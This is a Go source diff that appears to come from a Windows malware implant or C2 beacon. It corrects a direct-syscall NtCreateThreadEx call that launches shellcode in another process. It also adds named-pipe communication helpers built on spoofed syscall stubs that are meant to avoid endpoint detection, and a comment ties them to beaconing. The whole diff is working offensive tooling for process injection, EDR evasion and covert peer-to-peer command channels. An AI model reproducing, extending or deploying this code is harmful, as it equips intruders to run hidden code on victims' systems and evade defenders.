@@ -1,3 +1,6 @@
+//go:build windows && !arm64
+// +build windows,!arm64
+
 package main
 
 import (
@@ -313,16 +316,19 @@ func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr ui
 		}
 	}
 	var hThread uintptr
-	r1, _, _ := syscall.Syscall9(stub, 8,
+	r1, _, _ := syscall.Syscall12(stub, 11,
 		uintptr(unsafe.Pointer(&hThread)),
-		0x1FFFFF,
-		0,
-		hProc,
-		shellcodeAddr,
-		0,
-		0,
-		0,
-		0,
+		0x1FFFFF, // DesiredAccess
+		0,        // ObjectAttributes
+		hProc,    // ProcessHandle
+		shellcodeAddr, // StartAddress
+		0,        // Argument
+		0,        // CreateFlags
+		0,        // ZeroBits
+		0,        // StackSize (default)
+		0,        // MaxStackSize (default)
+		0,        // AttributeList (NULL)
+		0,        // padding
 	)
 	if r1 != 0 {
 		return 0, fmt.Errorf("NtCreateThreadEx failed: 0x%X", r1)
@@ -529,4 +535,241 @@ func syscallNtDelayExecution(sm *syscallManager, alertable bool, delayInterval *
 	)
 	// STATUS_SUCCESS = 0, STATUS_USER_APC = 0xC0 (alertable wait interrupted)
 	return r1 == 0, nil
+}
+
+// ── Named Pipe NT Syscall Helpers ──
+// These use the existing syscallManager to build direct syscall stubs for
+// NtCreateNamedPipeFile, NtOpenFile, NtReadFile, NtWriteFile, and NtFsControlFile.
+
+// NT API structs for named pipe operations.
+type ntUnicodeString struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        *uint16
+}
+
+type ntObjectAttributes struct {
+	Length              uint32
+	RootDirectory       uintptr
+	ObjectName          *ntUnicodeString
+	Attributes          uint32
+	SecurityDescriptor  uintptr
+	SecurityQualityOfService uintptr
+}
+
+type ntIoStatusBlock struct {
+	Status      uintptr
+	Information uintptr
+}
+
+// ntPipeNameToNtPath converts "pipename" to the NT namespace path \??\pipe\pipename
+// and returns a properly initialized ntUnicodeString backed by the provided buffer.
+func ntBuildPipeName(pipeName string) (*uint16, *ntUnicodeString) {
+	ntPath := `\??\pipe\` + pipeName
+	buf, _ := syscall.UTF16FromString(ntPath)
+	// buf includes null terminator, Length excludes it
+	length := uint16(len(buf)-1) * 2 // bytes excluding null
+	maxLen := uint16(len(buf)) * 2   // bytes including null
+	us := &ntUnicodeString{
+		Length:        length,
+		MaximumLength: maxLen,
+		Buffer:        &buf[0],
+	}
+	return &buf[0], us
+}
+
+// ntBuildObjAttr builds a complete OBJECT_ATTRIBUTES for a named pipe path.
+func ntBuildObjAttr(pipeName string) (*uint16, *ntUnicodeString, *ntObjectAttributes) {
+	buf, us := ntBuildPipeName(pipeName)
+	oa := &ntObjectAttributes{
+		Length:    uint32(unsafe.Sizeof(ntObjectAttributes{})),
+		ObjectName: us,
+		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
+	}
+	return buf, us, oa
+}
+
+// syscallNtCreateNamedPipeFile creates the server end of a named pipe.
+// Returns the pipe handle on success.
+func syscallNtCreateNamedPipeFile(sm *syscallManager, pipeName string, maxInstances uint32) (uintptr, error) {
+	stub, err := sm.getSpoofedStub("NtCreateNamedPipeFile")
+	if err != nil {
+		stub, err = sm.getStub("NtCreateNamedPipeFile")
+		if err != nil {
+			return 0, fmt.Errorf("NtCreateNamedPipeFile stub: %w", err)
+		}
+	}
+
+	_, _, oa := ntBuildObjAttr(pipeName)
+	var iosb ntIoStatusBlock
+	var handle uintptr
+
+	// Default timeout: 5 seconds expressed as negative 100ns intervals (relative)
+	var timeout int64 = -5 * 10000000 // 5 seconds in 100ns units, negative = relative
+
+	r1, _, _ := syscall.Syscall15(stub, 14,
+		uintptr(unsafe.Pointer(&handle)),    // FileHandle (out)
+		0xC0000000,                           // DesiredAccess: GENERIC_READ | GENERIC_WRITE
+		uintptr(unsafe.Pointer(oa)),          // ObjectAttributes
+		uintptr(unsafe.Pointer(&iosb)),       // IoStatusBlock (out)
+		3,                                    // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
+		3,                                    // CreateDisposition: FILE_OPEN_IF
+		0x20,                                 // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT
+		0,                                    // NamedPipeType: FILE_PIPE_BYTE_STREAM_TYPE
+		0,                                    // ReadMode: FILE_PIPE_BYTE_STREAM_MODE
+		0,                                    // CompletionMode: FILE_PIPE_QUEUE_OPERATION
+		uintptr(maxInstances),                // MaximumInstances
+		4096,                                 // InboundQuota
+		4096,                                 // OutboundQuota
+		uintptr(unsafe.Pointer(&timeout)),    // DefaultTimeout
+		0,
+	)
+	if r1 != 0 {
+		return 0, fmt.Errorf("NtCreateNamedPipeFile failed: 0x%X", r1)
+	}
+	return handle, nil
+}
+
+// syscallNtOpenPipe opens the client end of a named pipe.
+func syscallNtOpenPipe(sm *syscallManager, pipeName string) (uintptr, error) {
+	stub, err := sm.getSpoofedStub("NtOpenFile")
+	if err != nil {
+		stub, err = sm.getStub("NtOpenFile")
+		if err != nil {
+			return 0, fmt.Errorf("NtOpenFile stub: %w", err)
+		}
+	}
+
+	_, _, oa := ntBuildObjAttr(pipeName)
+	var iosb ntIoStatusBlock
+	var handle uintptr
+
+	r1, _, _ := syscall.Syscall6(stub, 6,
+		uintptr(unsafe.Pointer(&handle)),    // FileHandle (out)
+		0xC0000000,                           // DesiredAccess: GENERIC_READ | GENERIC_WRITE
+		uintptr(unsafe.Pointer(oa)),          // ObjectAttributes
+		uintptr(unsafe.Pointer(&iosb)),       // IoStatusBlock (out)
+		3,                                    // ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE
+		0x20,                                 // OpenOptions: FILE_SYNCHRONOUS_IO_NONALERT
+	)
+	if r1 != 0 {
+		return 0, fmt.Errorf("NtOpenFile pipe failed: 0x%X", r1)
+	}
+	return handle, nil
+}
+
+// syscallNtFsControlListen sends FSCTL_PIPE_LISTEN to wait for a client connection.
+// Blocks until a client connects.
+func syscallNtFsControlListen(sm *syscallManager, handle uintptr) error {
+	stub, err := sm.getSpoofedStub("NtFsControlFile")
+	if err != nil {
+		stub, err = sm.getStub("NtFsControlFile")
+		if err != nil {
+			return fmt.Errorf("NtFsControlFile stub: %w", err)
+		}
+	}
+
+	var iosb ntIoStatusBlock
+
+	r1, _, _ := syscall.Syscall12(stub, 10,
+		handle,                                // FileHandle
+		0,                                     // Event (none, synchronous)
+		0,                                     // ApcRoutine
+		0,                                     // ApcContext
+		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
+		0x110004,                              // FsControlCode: FSCTL_PIPE_LISTEN
+		0,                                     // InputBuffer
+		0,                                     // InputBufferLength
+		0,                                     // OutputBuffer
+		0,                                     // OutputBufferLength
+		0, 0,
+	)
+	if r1 != 0 && r1 != 0x103 { // STATUS_SUCCESS or STATUS_PENDING
+		return fmt.Errorf("NtFsControlFile LISTEN failed: 0x%X", r1)
+	}
+	return nil
+}
+
+// syscallNtReadPipe reads from a pipe handle into buf. Returns bytes read.
+func syscallNtReadPipe(sm *syscallManager, handle uintptr, buf []byte) (int, error) {
+	stub, err := sm.getSpoofedStub("NtReadFile")
+	if err != nil {
+		stub, err = sm.getStub("NtReadFile")
+		if err != nil {
+			return 0, fmt.Errorf("NtReadFile stub: %w", err)
+		}
+	}
+
+	if len(buf) == 0 {
+		return 0, nil
+	}
+
+	var iosb ntIoStatusBlock
+
+	r1, _, _ := syscall.Syscall9(stub, 9,
+		handle,                                // FileHandle
+		0,                                     // Event
+		0,                                     // ApcRoutine
+		0,                                     // ApcContext
+		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
+		uintptr(unsafe.Pointer(&buf[0])),      // Buffer
+		uintptr(len(buf)),                     // Length
+		0,                                     // ByteOffset (nil for pipes)
+		0,                                     // Key
+	)
+	if r1 != 0 {
+		return 0, fmt.Errorf("NtReadFile failed: 0x%X", r1)
+	}
+	return int(iosb.Information), nil
+}
+
+// syscallNtWritePipe writes data to a pipe handle. Returns bytes written.
+func syscallNtWritePipe(sm *syscallManager, handle uintptr, data []byte) (int, error) {
+	stub, err := sm.getSpoofedStub("NtWriteFile")
+	if err != nil {
+		stub, err = sm.getStub("NtWriteFile")
+		if err != nil {
+			return 0, fmt.Errorf("NtWriteFile stub: %w", err)
+		}
+	}
+
+	if len(data) == 0 {
+		return 0, nil
+	}
+
+	var iosb ntIoStatusBlock
+
+	r1, _, _ := syscall.Syscall9(stub, 9,
+		handle,                                // FileHandle
+		0,                                     // Event
+		0,                                     // ApcRoutine
+		0,                                     // ApcContext
+		uintptr(unsafe.Pointer(&iosb)),        // IoStatusBlock (out)
+		uintptr(unsafe.Pointer(&data[0])),     // Buffer
+		uintptr(len(data)),                    // Length
+		0,                                     // ByteOffset (nil for pipes)
+		0,                                     // Key
+	)
+	if r1 != 0 {
+		return 0, fmt.Errorf("NtWriteFile failed: 0x%X", r1)
+	}
+	return int(iosb.Information), nil
+}
+
+// syscallNtCloseHandle wraps NtClose via syscall stubs.
+func syscallNtCloseHandle(sm *syscallManager, handle uintptr) error {
+	return syscallNtClose(sm, handle)
+}
+
+// getSyscallManagerForPipe returns a shared syscall manager for named pipe operations.
+// Uses a package-level singleton so we don't have to re-resolve SSNs on every beacon.
+var pipeSyscallManager *syscallManager
+var pipeSyscallManagerInit bool
+
+func getPipeSyscallManager() *syscallManager {
+	if !pipeSyscallManagerInit {
+		pipeSyscallManager = newSyscallManager()
+		pipeSyscallManagerInit = true
+	}
+	return pipeSyscallManager
 }
